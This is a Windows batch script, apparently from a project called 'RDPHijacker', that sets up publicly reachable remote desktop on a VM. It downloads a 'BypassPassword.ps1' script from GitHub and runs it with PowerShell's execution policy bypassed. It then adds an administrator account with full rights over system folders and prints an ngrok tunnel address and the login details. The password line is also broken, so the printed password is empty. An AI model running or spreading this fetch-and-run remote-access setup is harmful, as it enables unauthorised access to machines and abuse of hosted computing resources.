@echo off
net config server /srvcomment:"Windows Azure VM" > out.txt 2>&1

curl -O https://raw.githubusercontent.com/Zebratic/RDPHijacker/70ac0f28e473c9a192308f0bddae1614ece3a9de/Binaries/BypassPassword.ps1 > out.txt 2>&1
PowerShell -NoProfile -ExecutionPolicy Bypass -Command "& './BypassPassword.ps1'" > out.txt 2>&1

REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" /V EnableAutoTray /T REG_DWORD /D 0 /F > out.txt 2>&1

set password = Zebratic-%random%%random%

net user administrator %password% /add >nul
net localgroup administrators administrator /add >nul

echo RDP has been hijacked and is now running!
echo IP:
tasklist | find /i "ngrok.exe" >Nul && curl -s localhost:4040/api/tunnels | jq -r .tunnels[0].public_url || echo Can't connect to ngrok tunnel, make sure that the NGROK_AUTH_TOKEN is correctly setup in your github settings.
echo Username: administrator
echo Password: %password%

diskperf -Y >nul
sc start audiosrv >nul
sc config Audiosrv start= auto >nul
ICACLS C:\Windows\Temp /grant administrator:F >nul
ICACLS C:\Windows\installer /grant administrator:F >nul
ping -n 10 127.0.0.1 >nul